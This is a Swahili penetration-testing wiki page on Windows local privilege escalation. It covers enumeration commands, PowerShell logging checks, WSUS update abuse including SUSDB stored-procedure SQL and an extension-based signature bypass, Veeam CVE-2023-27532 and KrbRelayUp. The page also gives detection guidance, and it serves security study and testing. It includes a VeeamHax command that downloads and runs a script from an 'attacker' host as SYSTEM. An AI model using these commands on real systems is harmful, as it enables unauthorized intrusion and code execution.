# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Zana bora ya kutafuta njia za Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ukurasa huu unakusanya mbinu za jumla za Windows privilege escalation kutoka kwenye miongozo kadhaa ya msingi.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Mtiririko wake wa vitendo wa enumeration pia umetokana na warsha na orodha za ukaguzi za jumuiya.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Maudhui ya kihistoria kuhusu mashambulizi yanajumuisha wasilisho la DerbyCon kuhusu Windows privilege escalation.<sup>[[5]](#references)</sup>

Kwa mapitio mafupi, tumia [orodha ya ukaguzi ya local privilege escalation](../checklist-windows-privilege-escalation.md).

## Nadharia ya Awali ya Windows

### Access Tokens

**Ikiwa hujui Access Tokens za Windows ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Tazama ukurasa ufuatao kwa maelezo zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Ikiwa hujui Integrity Levels katika Windows ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Vidhibiti vya Usalama vya Windows

Kuna vitu mbalimbali katika Windows vinavyoweza **kukuzuia kufanya enumeration ya mfumo**, kuendesha executables au hata **kutambua shughuli zako**. Unapaswa **kusoma** **ukurasa** ufuatao na kufanya **enumeration** ya **mbinu** hizi zote za **ulinzi** kabla ya kuanza enumeration ya privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Ufikiaji wa kimwili unaweza pia kubadilisha uhariri wa offline wa UEFI NVRAM kuwa mnyororo wa DMA kabla ya boot na wa kubadilisha kumbukumbu ya Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess silent elevation

Michakato ya UIAccess inayoanzishwa kupitia `RAiLaunchAdminProcess` inaweza kutumiwa kufikia High IL bila maombi ya uthibitisho wakati ukaguzi wa secure-path wa AppInfo umepitwa. Angalia mtiririko maalum wa bypass ya UIAccess/Admin Protection hapa:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Uenezaji wa registry wa ufikivu wa Secure Desktop unaweza kutumiwa kuandika thamani yoyote kwenye registry ya SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Matoleo ya hivi karibuni ya Windows pia yameleta njia ya LPE ya **SMB arbitrary-port**, ambapo uthibitishaji wa NTLM wa ndani wenye mapendeleo unaakisiwa kupitia muunganisho wa SMB TCP uliotumika tena:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Taarifa za Mfumo

Kwa kufanya inventory ya ndani kutoka kwenye kipindi kilichopo cha PowerShell, tazama [Windows Enumeration with .NET](../basic-powershell-for-pentesters/dotnet-enumeration.md). Mifano hii inaongeza ukamilifu wa ukaguzi ulio hapa chini bila kuanzisha executables tofauti za enumeration.

### Enumeration ya taarifa za toleo

Angalia ikiwa toleo la Windows lina udhaifu wowote unaojulikana (pia angalia patches zilizotumika).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploits za Toleo

[Site](https://msrc.microsoft.com/update-guide/vulnerability) hii ni muhimu kwa kutafuta maelezo ya kina kuhusu udhaifu wa usalama wa Microsoft. Database hii ina zaidi ya udhaifu 4,700 wa usalama, ikionyesha **eneo kubwa la mashambulizi** linalowasilishwa na mazingira ya Windows.

**Kwenye mfumo**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ina watson iliyojumuishwa)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — hukusanya taarifa za OS build, updates zilizosakinishwa, na advisory candidates zilizochaguliwa; hakikisha product halisi na updates zilizochukua nafasi ya nyingine kabla ya kudhani kuwa matokeo yanatumika.

Kwa local exploit inayohusiana na toleo maalum, angalia **architecture ya process inayoendeshwa** pamoja na architecture ya OS. Kwenye Windows ya 64-bit, process ya 32-bit huathiriwa na [WOW64 file-system redirection](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` kwa kawaida huelekeza kwenye directory ya mfumo ya 32-bit, huku `%windir%\Sysnative` ikiipa process hiyo ufikiaji wa directory ya mfumo ya native. Alias hii haipatikani kwa process ya 64-bit. OS build au candidate ya KB iliyokosekana haithibitishi kuwa exploit inaweza kutumika; linganisha build inayoendeshwa, update iliyosakinishwa au iliyochukua nafasi ya nyingine, architecture ya process, na prerequisites za exploit na [Microsoft security bulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) ya suala husika.

Kwa mfano wa service-memory-corruption, angalia [client-controlled MIDI shared-memory ring offsets](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Stack offsets zilizochapishwa zinatumika kwa build iliyojaribiwa pekee; kupata `LOCAL SERVICE` ni hatua tofauti na hatua inayofuata ya [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md) ya kupata `SYSTEM`.<sup>[[44]](#references)</sup>

**Ndani ya mfumo ukiwa na taarifa za mfumo**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repo za exploits za Github:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Mazingira

Je, credentials/Juicy info yoyote imehifadhiwa kwenye env variables?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Historia ya PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

Wasifu wa [PowerShell unaoweza kuandikwa](../basic-powershell-for-pentesters/#powershell-profile-startup-injection) ni kidokezo tofauti cha utekelezaji wakati wa kuwasha; hakikisha kama mtumiaji mwenye haki za juu zaidi hupakia wasifu huo kabla ya kuuchukulia kama njia ya kuongeza haki.

### Faili za PowerShell Transcript

Unaweza kujifunza jinsi ya kuwasha kipengele hiki hapa: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` ni mfano tu. [Sera ya transcription ya PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) kwa kawaida huhifadhi faili kwenye folda ya Documents ya kila mtumiaji, lakini mipangilio ya `OutputDirectory` au `Start-Transcript -OutputDirectory` inaweza kuelekeza faili kwenye folda inayoshirikiwa au iliyofichwa. Kabla ya kukagua transcript, angalia njia halisi ya hifadhi na ACL za faili: inaweza kuwa na hoja za amri na matokeo, ikiwemo credentials. Transcript inayoweza kusomeka ni kidokezo tu iwapo yaliyomo yanafichua utambulisho wenye ruhusa za juu unaoweza kutumika, na utambulisho huo unaweza kuingia katika muktadha husika.

### PowerShell Module Logging

Maelezo ya utekelezaji wa PowerShell pipeline yanarekodiwa, yakijumuisha amri zilizotekelezwa, miito ya amri na sehemu za scripts. Hata hivyo, huenda maelezo kamili ya utekelezaji na matokeo yake yasinaswe.

Ili kuwezesha hili, fuata maagizo katika sehemu ya "Faili za transcript" ya nyaraka, ukichagua **"Module Logging"** badala ya **"Powershell Transcription"**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Ili kuona matukio 15 ya mwisho kutoka kwenye logi za PowerShell, unaweza kutekeleza:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Rekodi kamili ya shughuli na maudhui yote ya utekelezaji wa script hunaswa, na kuhakikisha kuwa kila sehemu ya code inaandikwa inapoendeshwa. Mchakato huu huhifadhi kumbukumbu pana ya ukaguzi ya kila shughuli, yenye manufaa kwa uchunguzi wa kitaalamu na kuchanganua tabia hasidi. Kwa kurekodi shughuli zote wakati wa utekelezaji, maarifa ya kina kuhusu mchakato hutolewa.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Matukio ya Script Block yanaweza kupatikana kwenye Windows Event Viewer katika njia hii: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Ili kuona matukio 20 ya hivi karibuni, unaweza kutumia:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Mipangilio ya Intaneti

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Viendeshi

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Mwongozo wa awali ulieleza hatari hii kama ifuatavyo:

Unaweza kuhatarisha mfumo ikiwa masasisho yanaombwa kupitia http badala ya http**S**.

Endpoint ya WSUS inayotumia HTTP ni kiashiria cha kuchunguza uwezekano wa kunasa metadata ya masasisho. Unyonyaji pia hutegemea kama mteja anatumia seva hiyo ya WSUS, kama mshambuliaji anaweza kunasa au kudhibiti trafiki yake, na sera za mteja za kuamini na kusakinisha masasisho. URL pekee haithibitishi kuwa utekelezaji wa msimbo unawezekana. [Microsoft inapendekeza TLS kwa metadata ya WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Unaanza kwa kukagua kama mtandao unatumia sasisho la WSUS lisilotumia SSL kwa kuendesha yafuatayo kwenye cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Au yafuatayo katika PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Ukipata jibu kama mojawapo ya haya:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Na ikiwa `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` au `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ni sawa na `1`.

Kauli ya awali kuhusu uwezekano wa kutumika ilikuwa:

Basi, **inaweza kutumiwa vibaya.** Ikiwa thamani ya mwisho ya registry ni sawa na 0, basi ingizo la WSUS litapuuzwa.

Wakati `UseWUServer` ni `1`, Windows Update hutumia huduma ya intraneti iliyosanidiwa. Hii inathibitisha sharti la awali kwa njia ya kuingilia mawasiliano ya HTTP, lakini haithibitishi kwamba kuingilia mawasiliano, kukubaliwa kwa update hasidi, au usakinishaji kwa ruhusa za juu kunawezekana. Ikiwa ni `0`, endpoint hii mahususi ya WSUS iliyosanidiwa haichaguliwi na sera hiyo.

Ili kutumia udhaifu huu vibaya, unaweza kutumia zana kama: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Hizi ni scripts za MiTM za exploits zilizoandaliwa kuingiza updates 'ghushi' kwenye trafiki ya WSUS isiyotumia SSL.

Soma utafiti hapa:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Soma ripoti kamili hapa**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Kimsingi, huu ndio udhaifu unaotumiwa na bug hii:

> Ikiwa tuna uwezo wa kurekebisha proxy ya mtumiaji wetu wa ndani, na Windows Updates hutumia proxy iliyosanidiwa katika mipangilio ya Internet Explorer, basi tuna uwezo wa kuendesha [PyWSUS](https://github.com/GoSecure/pywsus) ndani ya kifaa chetu ili kuingilia trafiki yetu wenyewe na kuendesha code kama mtumiaji mwenye ruhusa za juu kwenye kifaa chetu.
>
> Zaidi ya hayo, kwa kuwa huduma ya WSUS hutumia mipangilio ya mtumiaji wa sasa, itatumia pia hifadhi yake ya vyeti. Tukitengeneza cheti cha self-signed kwa hostname ya WSUS na kuongeza cheti hicho kwenye hifadhi ya vyeti ya mtumiaji wa sasa, tutaweza kuingilia trafiki ya WSUS ya HTTP na HTTPS. WSUS haitumii mbinu zinazofanana na HSTS ili kutekeleza uthibitishaji wa aina ya trust-on-first-use kwenye cheti. Ikiwa mtumiaji anaamini cheti kilichowasilishwa na kina hostname sahihi, huduma itakikubali.

Unaweza kutumia udhaifu huu vibaya kwa kutumia zana ya [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (ikishapatikana).

### Updates zinazodhibitiwa na msimamizi wa WSUS

Kuna njia tofauti ikiwa utambulisho wa sasa unaweza **kuchapisha na kuidhinisha** updates kwenye seva ya WSUS. Kagua uanachama halisi katika kikundi cha `WSUS Administrators` cha seva na ruhusa zozote za WSUS zilizokasimiwa, kisha tambua kikundi cha kompyuta za wateja ambacho kitapokea update iliyoidhinishwa. [Microsoft inahitaji ruhusa za WSUS Administrator ili kuidhinisha updates](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), na [inaeleza uhusiano wa uaminifu wa uchapishaji](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): wateja lazima waamini cheti cha kusaini kinachotumiwa kwa maudhui yaliyochapishwa ndani. Thibitisha kwamba update inayochunguzwa imesainiwa na kukubaliwa, inatumika kwa lengo, na inasakinishwa katika muktadha wenye ruhusa za juu zaidi kabla ya kuichukulia kama njia ya kuongeza ruhusa. Thamani ya HTTP `WUServer` au jina la kikundi pekee halithibitishi masharti hayo.

### Matumizi mabaya ya custom update kwenye SUSDB: payloads zisizosainiwa kupitia `.txt`/`.esd`

Huu ni ukiukaji tofauti wa mpaka wa uaminifu na kuingilia muunganisho wa WSUS wa HTTP: sharti la awali ni kuwa na ufikiaji wa kutosha wa **stored procedures za hifadhidata ya WSUS (`SUSDB`)** ili kuchapisha na kuidhinisha custom update. Njia moja ya vitendo ya kupata ufikiaji ni ku-relay akaunti ya kompyuta ya WSUS ya upstream kwenda kwenye seva tofauti ya MSSQL inayohifadhi `SUSDB`; sharti halisi hutegemea usanidi, kwa hiyo kwanza orodhesha ruhusa za `EXECUTE` badala ya kudhani kuwa unahitaji haki za msimamizi wa SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Kwa njia tofauti ya shambulio inayorelay uthibitishaji wa mteja wa WSUS kutoka HTTP/8530 kwenda LDAP, SMB, au AD CS, tazama [Kutumia WSUS HTTP kwa NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Thibitisha relay ya hifadhidata ya nje na ruhusa za procedures

Katika usanidi ambapo WSUS hutumia SQL Server ya nje, kwanza angalia ikiwa akaunti ya seva ya WSUS inaweza kuthibitishwa kwenye hifadhidata na ikiwa NTLM relay inaweza kufikia listener hiyo. Jukumu la SQL la seva linaweza kutoa ufikiaji wa procedures za kuchapisha updates hata kama uandishi wa moja kwa moja kwenye jedwali umekataliwa; `UPDATE` iliyoshindwa dhidi ya `SUSDB` haithibitishi kwamba uchapishaji umezuiwa. Kagua utambulisho halisi, uanachama wa role, na ruhusa za procedure katika kikao cha SQL kilichoidhinishwa kabla ya kujaribu custom update.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Ufafanuzi wa taratibu unaotumika sasa na `SoftwareDistributionPackage.xsd` iliyosakinishwa ni muhimu unaporejesha metadata halali ya update. Parent ya bundle na child ya payload kila moja zinahitaji `UpdateIdentity` (aina ya fragment `1`), `LocalizedProperties` (`4`), na `ExtendedProperties` (`2`); hifadhi local revision ID inayorejeshwa na kila mwito wa `spImportUpdate` na uhakikishe uhusiano wa bundle, digests, ukubwa, content URL na revision vinaendana. Huu ni mtiririko wa uchapishaji wenye hali inayobadilika, kwa hivyo mwito mmoja tu wa stored procedure uliofanikiwa si uthibitisho wa utekelezaji upande wa client.<sup>[[38]](#references)</sup>

#### Jenga, lengesha na uidhinishe update

Mtiririko wa kazi wa custom-update hutumia taratibu halali za WSUS kama API ya uchapishaji yenye vizuizi. Mabadiliko muhimu ya hali ni:<sup>[[38]](#references)</sup>

| Hatua | Stored procedures husika |
| --- | --- |
| Leta metadata ya update | `spImportUpdate` |
| Hifadhi vipande vya XML vya sharti la awali, vilivyowekwa kulingana na lugha na vilivyopanuliwa | `spSaveXMLFragment` |
| Husisha digest ya content na URL inayodhibitiwa na mshambuliaji | `spSetBatchURL` |
| Orodhesha/unda kundi la kompyuta na uongeze client | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Idhinisha usakinishaji kwa kundi hilo | `spDeployUpdate` yenye `@actionID = 0` na `@isAssigned = 1` |

Jina la faili, digests, ukubwa na handler ya `CommandLineInstallation` lazima zilingane katika metadata/vipande vilivyoletwa. Baada ya kuweka content URL na kundi lengwa, idhini ya mwisho inafanana na ifuatayo; tumia vitambulisho vipya vya update, kundi na deployment badala ya kutumia tena GUID za mfano.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### обход wa ukaguzi wa sahihi unaotegemea kiendelezi

WSUS kwa kawaida hukataa maudhui yoyote ya executable ambayo hayajasainiwa. Hata hivyo, katika `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, njia ya .NET `VerifyFile` huweka flag ya ukaguzi wa cheti kuwa false ikiwa jina la faili lililotolewa linaishia kwa `.txt` au `.esd`; kisha `CheckCertificateSignature` hurukwa bila kuthibitisha kwanza kwamba baiti hizo ni maandishi au picha halali ya ESD. Kwa hivyo, PE isiyobadilishwa yenye jina kama `payload.exe.txt` inaweza kupita ukaguzi wa maudhui na baadaye kuendeshwa na handler ya usakinishaji ya command-line ya update. Hili ni hitilafu ya sera na mkanganyiko wa aina, si kughushi sahihi.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Uwekaji wa maudhui na uendeshaji otomatiki unaooana na BITS

Kuita `spDeployUpdate` hufanya WSUS ichukue maudhui yaliyosajiliwa. Chanzo lazima kitimize matarajio ya HTTP ya BITS: URL inayofikika pekee haitoshi kwa sababu uhamishaji hutumia mtiririko wa awali wa `HEAD`/`GET` na maombi ya byte-range. Seva isiyoauni Range husababisha tukio la WSUS la ulandanishi `EventId=364`, linalosema kwamba BITS inahitaji kichwa cha itifaki ya Range.<sup>[[39]](#references)</sup>

PoC ya utafiti [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) hutengeneza SQL inayohitajika kwa mnyororo wa import/fragment/URL/group/deployment, inajumuisha mteja wa MSSQL uliorekebishwa kwa ajili ya kuitekeleza, na huja na `BitsWebServer.py` kwa uwekaji wa maudhui. Mfano mdogo wa matumizi katika maabara iliyoidhinishwa ni:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Utekelezaji bila uangalizi na persistence ya kujaribu tena

Mwingiliano wa upande wa client hutegemea policy. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, chaguo `4 - Auto download and schedule install`, hufanya update iliyoidhinishwa ipakuliwe na kusakinishwa kwa ratiba iliyosanidiwa bila mtumiaji kuichagua mwenyewe. Katika majaribio, payload ambayo update yake ilibaki imeshindwa/kukamilika bila mafanikio ilitolewa tena mara moja baada ya mchakato wa callback kutoka, kwa hiyo tabia ya kujaribu tena inaweza kuwa persistence ya utekelezaji inayojirudia; inaonekana wazi kwa sababu client huonyesha hali ya update kushindwa.<sup>[[39]](#references)</sup>

#### Mielekeo ya kugundua na kuimarisha ulinzi

Mielekeo muhimu ya upande wa server na client kutoka kwenye chain hii ni:<sup>[[39]](#references)</sup>

- Kagua utekelezaji wa `SUSDB` wa `spCreateTargetGroup`, `spSetBatchURL` na `spDeployUpdate`; chunguza vikundi vipya vya targeting, origins za maudhui za nje, payload za update za `.txt`/`.esd` na deployments zilizofanywa na principals zisizotarajiwa (hasa akaunti zisizo za computer).
- Kagua `C:\Program Files\Update Services\LogFiles` kwa `ContentSyncAgent`, `FileVerified`, `FileVerficationFailed` iliyoandikwa vibaya, na `EventId=364`; linganisha uthibitishaji na extension ya payload pamoja na content magic badala ya kutegemea suffix.
- Tafuta usakinishaji wa Windows Update unaoshindwa/kujaribu tena mara kwa mara na utekelezaji wa PE au shughuli zisizotarajiwa za child/network kutoka kwenye maudhui yenye majina ya `.txt` au `.esd`.
- Inapoungwa mkono, hitaji Extended Protection for Authentication kwenye database service, na zuia ufikiaji wa mtandao wa database kwa WSUS server na mifumo ya usimamizi iliyoidhinishwa. Punguza na kagua haki za `EXECUTE` kwenye procedures za custom-update.

## Visasishaji vya Auto vya Wahusika Wengine na Agent IPC (local privesc)

Agent nyingi za enterprise huweka uso wa IPC wa localhost na channel ya update yenye privileges za juu. Ikiwa enrollment inaweza kulazimishwa kuunganishwa na server ya attacker na updater ikaamini root CA bandia au ukaguzi dhaifu wa signer, mtumiaji wa local anaweza kuwasilisha MSI hasidi ambayo service ya SYSTEM husakinisha. Tazama technique ya jumla (inayotokana na chain ya Netskope stAgentSvc – CVE-2025-0309) hapa:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM kupitia TCP 9401)

Maelezo ya awali yaliyohusu toleo maalum na dokezo la reconnaissance yalikuwa:

Veeam B&R < `11.0.1.1261` huweka service ya localhost kwenye **TCP/9401** inayochakata ujumbe unaodhibitiwa na attacker, na kuruhusu amri zozote kutekelezwa kama **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Recon**: thibitisha listener na toleo, kwa mfano, `netstat -ano | findstr 9401` na `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication na Cloud Connect hutumia core backup service kwenye **TCP/9401 kwa default**. [Ushauri wa Veeam](https://www.veeam.com/kb4424) unaeleza ufichuaji usiohitaji authentication wa credentials za encrypted configuration-database ndani ya mpaka wa mtandao wa backup; PoC nyingine ya umma inaonyesha njia ya kutekeleza amri kama **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Service inaweza kufungamana na anwani iliyo nje ya localhost, kwa hiyo kagua anwani na PID yake halisi.

- **Recon**: thibitisha kuwa TCP/9401 inahusishwa na `Veeam.Backup.Service.exe`, kisha kagua bidhaa iliyosakinishwa na metadata ya patch. `netstat -ano | findstr 9401` na `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` ni vidokezo, si ukaguzi kamili wa patch.
- **Matoleo ya chini yaliyorekebishwa**: Veeam inaorodhesha **11a build 11.0.1.1261 P20230227** na **12 build 12.0.0.1420 P20230223** kama matoleo ya kwanza yaliyorekebishwa; matoleo ya awali yameathirika. File version yenye sehemu nne pekee haiwezi kutofautisha base build isiyopata patch na patch ya baadaye kwenye build number zilezile. Thibitisha kitambulisho cha patch kwenye [historia ya build ya vendor](https://www.veeam.com/kb2680) kabla ya kusema kuwa boundary build imerekebishwa.
- **Exploit**: weka PoC kama `VeeamHax.exe` pamoja na Veeam DLL zinazohitajika kwenye directory moja, kisha anzisha payload ya SYSTEM kupitia local socket:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Huduma hutekeleza amri kama SYSTEM.

PoC iliyotajwa inaonyesha utekelezaji wa amri kama SYSTEM pale masharti yake ya ziada yanapotimizwa; ushauri wa vendor unaeleza tatizo la kufichuliwa kwa credential.

## KrbRelayUp

Maelezo ya awali kuhusu mazingira chaguomsingi yalikuwa:

Udhaifu wa **local privilege escalation** upo katika mazingira ya Windows **domain** chini ya masharti mahususi. Masharti haya yanajumuisha mazingira ambayo **LDAP signing haijatekelezwa,** watumiaji wana haki binafsi zinazowaruhusu kusanidi **Resource-Based Constrained Delegation (RBCD),** na watumiaji wana uwezo wa kuunda kompyuta ndani ya domain. Ni muhimu kutambua kwamba **mahitaji** haya hutimizwa kwa kutumia **mipangilio chaguomsingi**.

Relay ya Kerberos ya ndani inaweza kuvuka kutoka kwenye logon yenye ruhusa chache hadi kwenye uandishi wa directory wenye ruhusa za juu pale COM server inayofaa inapothibitisha utambulisho na principal inayorelayiwa ikiwa na haki kwenye object lengwa. [KrbRelay documents](https://github.com/cube0x0/KrbRelay) uandishi wa LDAP wa RBCD na `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp huendesha kiotomatiki baadhi ya njia hizi. Mnyororo wa RBCD unahitaji haki zinazofaa za delegation na object lengwa, huku mnyororo wa shadow-credential ukihitaji haki za kuandika key-credential na KDC inayotumia njia ya uthibitishaji wa certificate. Hakuna njia kati ya hizi inayotokana na uanachama wa domain pekee.

